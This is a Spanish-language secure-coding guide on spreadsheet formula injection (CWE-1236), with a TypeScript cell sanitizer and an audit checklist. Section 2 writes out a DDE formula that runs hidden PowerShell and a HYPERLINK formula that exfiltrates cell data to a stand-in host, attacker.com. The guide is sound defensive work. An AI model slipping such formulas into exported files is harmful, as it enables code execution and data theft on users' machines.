# Mitigación y Detección de Formula Injection en Hojas de Cálculo (CWE-1236)

> **ID de Vulnerabilidad:** `VULN-SAST-022`  
> **Taxonomía:** CWE-1236 (*Improper Neutralization of Formula Elements in a CSV/Spreadsheet File*) / OWASP Top 10 A03:2021/2025 (Injection) / MITRE ATT&CK T1059  
> **Dimensión:** `SOURCE_CODE_SAST`  
> **Skill:** `source-code-sast`  
> **Herramienta Capa 3:** `src/scripts/scan_formula_injection.py`  
> **Contrato Zod:** `src/schemas/formula-injection.schema.ts`  

---

## 1. Mecanismo del Fallo y Superficie de Explotación

Cuando una aplicación exporta datos generados por usuarios, prospectos web o respuestas de modelos de IA hacia formatos tabulares (CSV, TSV, XLSX) sin neutralización previa, un atacante puede inyectar fórmulas dinámicas que se ejecutan automáticamente al abrir el archivo en suites ofimáticas como **Microsoft Excel**, **LibreOffice Calc** o **Google Sheets**.

### Caracteres Desencadenantes Canónicos
Toda celda cuyo primer carácter imprimible pertenezca a la siguiente familia activa el intérprete de fórmulas:
- `=` : Inicia fórmulas nativas y comandos DDE (`=cmd|'/C calc'!A0`).
- `+` : Operador aritmético unario interpretado como fórmula (`+1234567890-2+cmd|...`).
- `-` : Operador aritmético unario (`-2+3+cmd|' /C notepad.exe'!A0`).
- `@` : Función de invocación en Excel / Calc (`@SUM(1+1)*cmd|...`).
- `\t` (Tab) / `\r` (Retorno de carro): Caracteres de control que pueden omitir filtros de sanitización por prefijo.
- `|` : Separador de comandos o tuberías en fórmulas de hojas de cálculo.
- `%` : Prefijo de evaluación en macros y fórmulas de compatibilidad.

---

## 2. Vectores de Ataque Comprobados

### 2.1 Ejecución Remota de Código vía DDE (Dynamic Data Exchange)
```text
=cmd|'/C powershell -w hidden -enc <BASE64_PAYLOAD>'!A0
```
Al abrir el archivo y hacer clic en actualizar vínculos, Excel ejecuta el comando en el contexto del usuario del sistema operativo.

### 2.2 Exfiltración Clandestina de Datos Vía HIPERENLACE
```text
=HYPERLINK("https://attacker.com/leak?data=" & A1, "Clic para validar")
```
La hoja de cálculo concatena valores confidenciales de celdas vecinas (e.g. API keys, saldos o contraseñas) y los envía como parámetro GET al servidor del atacante.

---

## 3. Línea de Defensa Canónica Tri-Tier

### 3.1 Sanitización de Celdas (Regla del Prefijo de Comilla Simple)
La única defensa universal contra CWE-1236 consiste en **anteponer una comilla simple (`'`)** a cualquier celda cuyo valor comience con uno de los caracteres peligrosos. Las suites ofimáticas interpretan la comilla simple como directiva de forzado a texto plano sin mostrarla en la celda.

```typescript
// Patrón canónico de sanitización
export function sanitizeCsvCell(val: unknown): string {
  if (val === null || val === undefined) return '""';
  let s = String(val).trim();
  
  // Neutralizar prefijando con comilla simple si inicia con caracter de fórmula
  if (/^[=+\-@\t\r|%]/.test(s)) {
    s = `'${s}`;
  }
  
  // Escapar comillas dobles internas duplicándolas (RFC 4180)
  return `"${s.replace(/"/g, '""')}"`;
}
```

### 3.2 Inclusión Obligatoria de BOM UTF-8 (`\uFEFF`)
Para evitar que Excel interprete un archivo CSV UTF-8 bajo la página de códigos ANSI local de Windows (provocando mojibake y omisión de filtros de caracteres especiales), todo flujo CSV debe comenzar con el Byte Order Mark:

```typescript
const UTF8_BOM = '\uFEFF';
const csvContent = UTF8_BOM + rows.join('\r\n');
```

---

## 4. Checklist de Auditoría SAST para Exportadores

- [ ] ¿Toda función de generación de CSV/XLSX invoca `sanitizeCsvCell` sobre cada campo antes de la concatenación?
- [ ] ¿La expresión regular de detección cubre la totalidad de caracteres canónicos: `^[=+\-@\t\r|%]`?
- [ ] ¿El archivo CSV generado incluye explícitamente el prefijo UTF-8 BOM (`\uFEFF`)?
- [ ] ¿Se ejecutan tests automatizados con payloads DDE (`=cmd|...`) para verificar que la comilla simple precede al valor?
